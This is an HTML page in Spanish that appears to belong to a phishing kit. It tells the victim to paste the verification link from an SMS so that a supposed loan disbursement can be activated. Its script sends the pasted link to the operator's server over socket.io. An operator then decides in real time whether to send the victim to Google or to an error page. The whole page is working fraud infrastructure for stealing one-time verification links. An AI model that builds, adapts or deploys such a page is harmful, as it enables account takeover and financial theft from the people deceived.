<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enlace de Verificación</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f3f6f9;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      background: #fff;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .input-group {
      display: flex;
      align-items: center;
      background: #f0f2f5;
      border-radius: 8px;
      margin: 1rem 0;
      padding: 0.5rem 1rem;
      width: 100%;
    }

    .input-group .icon {
      color: #888;
      margin-right: 0.5rem;
    }

    .input-group input {
      border: none;
      background: transparent;
      outline: none;
      flex: 1;
      font-size: 1rem;
    }

    .campo-requerido {
      border: 1px solid red !important;
    }

    button {
      background: #F50009;
      color: white;
      padding: 0.75rem 2rem;
      border: none;
      border-radius: 50px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 1rem;
      transition: background 0.3s;
    }

    button:hover {
      background: #000000;
    }

    .mensaje-error {
      color: red;
      margin-top: 0.5rem;
      font-size: 0.85rem;
    }
  </style>
</head>
<body>
  <div class="screen">
    <h3>¡ÚLTIMO PASO!</h3>
    <p>Para confirmar tu identidad y que nuestro sistema pueda identificarte para activar tu desembolso, es necesario que valides con el enlace que se te envió a tu celular.</p>
    <h6>Por favor copia el enlace de tu SMS y pégalo a continuación para activar tu desembolso.</h6>
    <div class="input-group" id="grupoInput">
      <div class="icon"><i class="fas fa-link"></i></div>
      <input type="text" id="codigo" placeholder="Pega el enlace aquí" required>
    </div>
    <p class="mensaje-error" id="mensajeError"> </p>
    <button onclick="reintentarCodigo()">Validar enlace</button>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const sessionId = localStorage.getItem("sessionId");

    socket.emit("reconectar", sessionId);

    function reintentarCodigo() {
      const codigoInput = document.getElementById("codigo");
      const mensajeError = document.getElementById("mensajeError");
      const grupoInput = document.getElementById("grupoInput");
      const enlace = codigoInput.value.trim();

      // Limpiar estado anterior
      mensajeError.textContent = "";
      grupoInput.classList.remove("campo-requerido");

      // Validar enlace
      const urlRegex = /^(https?:\/\/)[^\s/$.?#].[^\s]*$/i;
      if (!enlace || !urlRegex.test(enlace)) {
        mensajeError.textContent = "Por favor ingresa un enlace válido que comience con http:// o https://";
        grupoInput.classList.add("campo-requerido");
        return;
      }

      // Enviar enlace al servidor
      socket.emit("otpIngresado", { codigo: enlace, sessionId });

      // Redirigir
      window.location.href = "opciones.html";
    }

    socket.on("respuestaOtp", (decision) => {
      if (decision === "finalizar") {
        window.location.href = "https://www.google.com";
      } else if (decision === "otp_error") {
        window.location.href = "denegado.html";
      }
    });
  </script>
</body>
</html>
